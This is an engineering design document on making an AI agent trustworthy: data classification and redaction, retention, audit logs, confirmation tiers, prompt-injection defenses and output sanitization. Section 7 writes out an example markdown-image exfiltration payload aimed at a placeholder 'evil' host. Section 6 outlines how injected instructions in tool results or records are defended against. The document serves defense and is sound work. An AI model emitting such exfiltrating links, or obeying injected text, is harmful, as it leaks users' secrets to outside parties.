# Trust — data, retention, audit, confirmation tiers, output safety

What makes an agent safe to leave running: what data it may touch, how long anything is kept, who did what, how much autonomy each tool gets, and what the model's output may contain. Each section states a principle and the reasoning. Tier 2 ("act with undo", section 4) is an **optional extension**: the shipped scaffold still rejects `write`, and nothing here changes that until you choose to build it.

## Contents

1. [Data classification and PII](#1-data-classification-and-pii)
2. [Retention and deletion](#2-retention-and-deletion)
3. [Audit log](#3-audit-log)
4. [Confirmation tiers](#4-confirmation-tiers)
5. [Choosing a tool's tier](#5-choosing-a-tools-tier)
6. [Prompt-injection posture](#6-prompt-injection-posture)
7. [Model output safety](#7-model-output-safety)
8. [Abuse controls](#8-abuse-controls)
9. [Trust checklist](#9-trust-checklist)

## 1. Data classification and PII

**Principle:** the model gets what it needs to answer; the tracer stores what it needs to debug. These are different sets.

Classify every field a tool can return: **public** (safe anywhere), **internal** (business data, shown to permitted users), **sensitive** (PII, contact details, payment, health, credentials, free-text notes that may contain any of those). Record the class next to the tool's projection, because the projection is the only place a field can be dropped before the model sees it.

- **Into the prompt:** only fields the caller's role may see in the normal UI (parity, section 5), already minimized by slim projections (`architecture.md` §5). Never secrets, tokens, or password hashes, even for admins: no question needs them. Prefer a derived value ("has a phone on file") over the value when the answer does not need it.
- **Redaction applies to what is stored, not what the model needs.** Redacting a tool result before the model reads it would break the answer ("email the customer" needs the address); redacting it before the *tracer* stores it costs nothing. So:

```ts
// applied at the tracer boundary only: span input/output, tool observation output, error text
const safe = redact(value); // emails -> [email], phones -> [phone], card/ID patterns -> [number], auth headers/tokens -> [secret]
```

- `redact()` runs on **trace inputs/outputs and tool results** as recorded, plus server logs. It never runs on `ChatInput` or on what is persisted for conversation replay (that store is the product, with its own retention, section 2).
- Pattern redaction is best-effort: regexes miss names and free text. For sensitive classes, prefer **field-level** redaction (drop the field from the recorded tool result by name) over pattern matching, and treat pattern matching as the net underneath.
- Test it: feed a fixture containing an email, a phone, a token and a card number through a turn; assert none appear in the exported trace. A redactor with no test rots silently.
- **Vendor posture:** know whether your provider retains prompts or trains on them (API data is usually not trained on; check the account setting and contract) and record the answer. Sensitive classes that cannot be sent at all are excluded at the projection, not instructed away in the prompt.
- Attachments are user-controlled content: extracted text is data (`inputs.md` §2) and is classified **sensitive** by default.

## 2. Retention and deletion

**Principle:** every stored artifact has a stated lifetime and a way to delete it; "kept forever" is an unmade decision.

| Store | Default TTL (state yours) | Delete path |
|---|---|---|
| Conversations + messages | 12 months since last activity | user `DELETE /conversations/:id` (cascades below); TTL job |
| Attachments (files, extracted text) | with the conversation; raw files 30 days | cascade; TTL job on raw files |
| Proposals | with the conversation (decided ones feed audit, section 3) | cascade |
| Traces | 30-90 days | tracer retention setting; delete-by-userId on account deletion |
| Memories (cross-conversation facts, if built) | until deleted by the user | user list + delete UI; `memory_deleted` audit event |
| Usage counters (`reliability.md` §2) | 13 months (billing/trend) | contain no content, so not user-deletable |
| Audit log | 12-24 months, longer if regulation says | not user-deletable; purged by TTL only |

- **User-initiated delete cascades**: conversation -> messages, attachments (including blob storage), proposals, run state, and stored `traceId` references. Delete in dependency order and make it idempotent so a half-finished delete can be re-run. Also delete the trace by id where your tracer supports it; if it does not, the TTL is the bound and the user-facing copy must say so.
- **Audit rows survive conversation deletion**, but carry only ids and action names (section 3), no message content, so deleting the conversation does delete the user's words.
- **Account deletion** removes everything keyed by `userId` across all stores above, including traces, and keeps only the audit rows the retention table says to keep.
- Backups age out by their own schedule: state it, do not promise instant erasure.
- Implement TTL as a scheduled job or a store-native TTL index, not "someone will clean up". The job's own failure must alert.

## 3. Audit log

**Principle:** traces explain a turn for debugging; the audit log answers "who did what to which record, and was it the model?" for accountability. They differ in audience, retention, and mutability, so they are separate stores.

```ts
interface AuditEvent {
  actorUserId: string;       // the human on whose authority this ran, never 'model'
  action: 'tool_call' | 'proposal_accepted' | 'proposal_rejected'
        | 'action_applied' | 'action_undone' | 'memory_deleted';
  target: string;            // e.g. 'task:123', tool name for reads; an id, not content
  conversationId: string;
  traceId?: string;          // joins to the debugging detail
  at: Date;
}
```

- **Mutations are written synchronously**, in the request, before the response returns (and for `action_applied`, in the same unit of work as the change where the store allows). A mutation with no audit row must be impossible, so a failed audit write fails the request.
- **Reads (`tool_call` for read tools) are written asynchronously**, batched, best-effort: a tracer-style fire-and-forget queue. Losing one read row is acceptable; adding a DB write to every read round is not.
- Append-only: the application role has insert and select, no update or delete; purge by retention job only.
- **Ids and names, not content.** No prompt text, no tool results, no PII: it must be safe to keep longer than the conversation and to show to admins. Detail is one `traceId` hop away, behind trace access controls.
- `actorUserId` is the authenticated user. The model is never an actor: it proposes (tier 1) or acts under the user's authority (tier 2), and the row records that user.
- Admin audit view: filter by user, action, target, date; link `traceId` out. Query is by `(actorUserId, at)` and `(target, at)`; index both.

## 4. Confirmation tiers

**Principle:** autonomy is granted per tool by blast radius and reversibility, never by how sure the model seems.

| Tier | Mode | Who applies | Use for |
|---|---|---|---|
| 0 | `read` | the loop, directly | queries |
| 1 | `propose` | a human, via a card (`proposals.md`) | anything that matters; the default for all mutations |
| 2 | `act` (optional) | the loop, directly, with undo | reversible, low-blast-radius changes: toggle, tag, assign (when it notifies no one), save a draft |

Tier 0 and 1 are the existing doctrine and need no change. **Tier 2 is optional.** Build it only when a card for a trivial, instantly-reversible change is measurably hurting the experience (e.g. "tag these 5 tasks" needing 5 cards). If you do not build it, `write` stays hard-rejected exactly as `architecture.md` §5 says.

**Why it can be safe:** the property that justified a human in the loop was "a wrong mutation is an incident". If the mutation is reversible by a one-click, server-enforced undo, a wrong one is a two-second annoyance, and the user is still the authority because the change is shown and undoable.

**Seam change, stated exactly.** Today the loop dispatches `read` and `propose` and drops `write`. Tier 2 adds one mode and four pieces:

1. **Contract** (`registry.ts`): `mode: 'read' | 'propose' | 'act' | 'write'`. An `act` tool *must* declare `undo(ctx, receipt): Promise<void>` and its `execute` returns `{ ...result, receipt }` where `receipt` is the minimal data `undo` needs (previous value, created id). The registry refuses to register an `act` tool without `undo`; `write` is still dropped.
2. **Loop dispatch:** offer and dispatch `act` tools like `read`/`propose`. After a successful `execute`, the loop (via an injected `recordAction` callback, so it stays domain-free) persists an `ActionReceipt { userId, toolName, receipt, undoneAt?, expiresAt }` and emits an `action` event. A throw or `{ error }` writes no receipt.
3. **SSE event** (`runs-and-streaming.md` §4): `action` `{ id, label, detail?, expiresAt }`, mapped from the receipt like `step` (never the raw receipt). The UI renders it under the message with an **Undo** button until `expiresAt` (N minutes, e.g. 10).
4. **Undo route:** `POST /actions/:id/undo`. Filter `{ _id, userId }` (404 otherwise); reject if `undoneAt` set (**409**) or `expiresAt` passed (**410**); success is **204**; **re-check the permission** the tool requires (the user's role may have changed since); atomic claim `undoneAt = now` (conditional update, like a proposal claim); call the tool's `undo(ctx, receipt)` through the same shared service as the UI; on failure revert the claim and return a safe 422. Idempotent under retry (`reliability.md` §7). Write `action_undone` to the audit log synchronously; the loop writes `action_applied` the same way.

- **Stale undo:** if the target changed since the action (someone else edited it), `undo` must compare against the receipt and refuse with a clear message instead of clobbering. Same rule as `PROPOSAL_STALE` (`proposals.md` §7).
- The model is told the outcome in the tool result ("applied; the user can undo for 10 minutes"), and the prompt still forbids claiming more than the result says.
- Add golden cases: an `act` tool is called for an unambiguous request, is *not* called for an ambiguous one, and undo restores the prior state (deterministic, status/state assertions).

## 5. Choosing a tool's tier

Ask in order; the first "yes" fixes the minimum tier:

1. **Irreversible?** (delete, send, issue, publish, anything the UI cannot undo) -> never below tier 1, and the prompt confirms ambiguous targets.
2. **Financial?** (price, invoice, payment, credit, refund) -> never below tier 1.
3. **External side effect?** (email, webhook, third-party API, notification) -> never below tier 1. An undo cannot un-send.
4. **Visible to others?** (comments, assignments that notify, shared status, anything a second person sees) -> never below tier 1. Undo hides the change, not that it was seen.
5. **Bulk?** (touches more than a few records) -> tier 1 with a count in the card.
6. Otherwise, **reversible, private to the actor or silent, one record, with a real inverse** -> tier 2 is allowed, not required. When in doubt, tier 1: a card is cheap and downgrading a tier later is easy; recovering from an over-trusted tool is not.

**The parity rule still applies at every tier** (`proposals.md` §2): the tool calls the same service the UI calls, with the same validation and permission, and the user's own role bounds it. Tier 2 grants the model no capability a user lacks; it only removes one click when undo is cheap. If the UI cannot undo it, neither can the agent.

## 6. Prompt-injection posture

Summary of the defenses, each defined elsewhere, none sufficient alone:

- **Authority comes from context, not the model** (pinned scope, role-filtered tools, permission re-check at dispatch): `architecture.md` §4-5.
- **Tool results and attachments are data, not instructions** in the prompt: `architecture.md` §10, `inputs.md` §2.
- **No path from injected text to a mutation without a human or an undo:** tier 1 cards, `proposals.md` §1; tier 2 limited to reversible changes (section 4).
- **Server-owned history** removes forged assistant/tool turns: `architecture.md` §8.
- **Output channel constraints** (section 7) stop exfiltration through links and markup.
- **A golden case per defense**, including an injection planted in a record's free text: `evals.md`.

Assume the prompt defense fails sometimes. The design goal is that when it does, the worst outcome is a bad card or an undoable tag, not a data leak or an incident.

## 7. Model output safety

**Principle:** rendered model text is untrusted input to your UI.

- **No raw HTML.** Render markdown through a sanitizing renderer with an allowlist (no `<script>`, `<iframe>`, `on*` attributes, `javascript:` or `data:` URLs). Never `dangerouslySetInnerHTML` model output.
- **No links the tools did not return.** An injected model can emit `![x](https://evil/?q=<secret>)`, which exfiltrates via the image fetch with no click. Strip or neutralize images and links whose URL is not on your own origin or in the turn's tool results; where practical, render links from structured tool results (cards, record chips) rather than from prose.
- **No internal ids in prose** (database ids, internal enum names): translate or omit (`architecture.md` §10). Where an id is the only handle (a record number), use the user-facing number, never the storage key. Code can enforce a scan for id-shaped strings on the final answer in tests.
- Step labels, not raw tool results, go to the client (`runs-and-streaming.md` §4).
- Numbers a user relies on come from cards and server-computed previews, not prose (`proposals.md` §4).

## 8. Abuse controls

- **Budgets and rate limits** per user and tenant bound the cost of abuse (`reliability.md` §2, §6).
- **Input caps:** message length, attachment count and size, mention count; reject with 413/400, never partially accept (`inputs.md` §2).
- **Repeat-offender signals:** many refusals, injection-pattern hits, or `RATE_LIMITED` responses from one user raise an alert and can trip a temporary lockout; a human decides on permanent action.
- **Enumeration:** 404 for not-found and not-owned alike; no tool returns "exists but forbidden" (`architecture.md` §8).
- **No open model proxy:** the endpoint answers within the agent's declared scope; the scope-decline rule plus a model allowlist (`reliability.md` §3) stops it being used as a free general-purpose API.
- **Kill switch:** a config flag disables the agent (or just `propose`/`act` tools) without a deploy; tools then return `{ available: false, reason }`.

## 9. Trust checklist

- [ ] Every tool field classified; sensitive fields dropped at the projection; no secrets reachable
- [ ] `redact()` on trace inputs/outputs, tool results and logs only; tested with a PII fixture
- [ ] Retention table filled in with a TTL and delete path per store; TTL jobs alert on failure
- [ ] User delete cascades to messages, attachments, proposals and traces (or states the trace TTL)
- [ ] `AuditEvent` store, append-only; mutations written synchronously, reads asynchronously; ids not content
- [ ] Every tool has a tier by the section 5 questions; nothing irreversible, financial, external or visible-to-others below tier 1
- [ ] If tier 2 is built: `act` requires `undo`, `ActionReceipt` persisted, `action` event emitted, `POST /actions/:id/undo` re-checks permission and claims atomically, stale undo refused
- [ ] If tier 2 is not built: `write` rejected by the loop, asserted in a test
- [ ] Parity: every mutating tool calls the shared service the UI calls
- [ ] Injection golden cases pass; output is sanitized, with no foreign links/images and no internal ids
- [ ] Kill switch and abuse alerts exist
